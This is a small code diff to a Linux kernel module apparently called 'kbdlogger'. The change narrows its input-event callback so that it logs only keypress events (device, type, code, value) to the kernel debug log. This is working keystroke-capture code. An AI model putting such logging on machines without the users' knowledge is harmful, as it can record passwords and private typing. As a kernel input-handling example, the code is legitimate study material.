@@ -68,8 +68,10 @@ static int kbdlogger_connect(struct input_handler *handler, struct input_dev *de
 static void kbdlogger_event(struct input_handle *handle, unsigned int type,
 			unsigned int code, int value)
 {
-	printk(KERN_DEBUG pr_fmt("Keyboard event. Dev: %s, Type: %d, Code: %d, Value: %d\n"),
+	if (type == EV_KEY) {
+		printk(KERN_DEBUG pr_fmt("Key event. Dev: %s, Type: %d, Code: %d, Value: %d\n"),
 	       dev_name(&handle->dev->dev), type, code, value);
+	}
 }
 
 
